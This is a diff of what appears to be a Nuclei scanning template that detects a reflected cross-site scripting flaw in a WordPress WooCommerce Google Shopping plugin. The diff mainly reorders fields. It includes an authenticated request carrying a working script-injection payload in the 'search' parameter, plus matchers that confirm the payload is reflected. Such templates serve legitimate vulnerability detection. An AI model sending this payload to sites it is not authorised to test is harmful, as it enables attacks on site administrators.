@@ -1,5 +1,4 @@
 id: elex-woocommerce-xss
-
 info:
   name: WordPress WooCommerce Google Shopping < 1.2.4 - Cross-Site Scripting
   author: dhiyaneshDk
@@ -10,14 +9,26 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
     cvss-score: 7.2
-    cwe-id: CWE-79
+    cwe-id: CWE-79,CWE-80
   metadata:
     runzero-review: REJECT/2025-11-07/excluding tag authenticated
     max-request: 2
-  tags: wp-plugin,xss,authenticated,woocommerce,wpscan,wordpress,vuln
-
+  tags: authenticated,vuln,woocommerce,wordpress,wp-plugin,wpscan,xss
 http:
-  - raw:
+  - matchers:
+      - part: body
+        type: word
+        words:
+          - </script><script>alert(document.domain)</script>
+      - part: header
+        type: word
+        words:
+          - text/html
+      - status:
+          - 200
+        type: status
+    matchers-condition: and
+    raw:
       - |
         POST /wp-login.php HTTP/1.1
         Host: {{Hostname}}
@@ -29,20 +40,3 @@ http:
       - |
         GET /wp-admin/admin.php?page=elex-product-feed-manage&search=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
         Host: {{Hostname}}
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - "</script><script>alert(document.domain)</script>"
-
-      - type: word
-        part: header
-        words:
-          - text/html
-
-      - type: status
-        status:
-          - 200
-
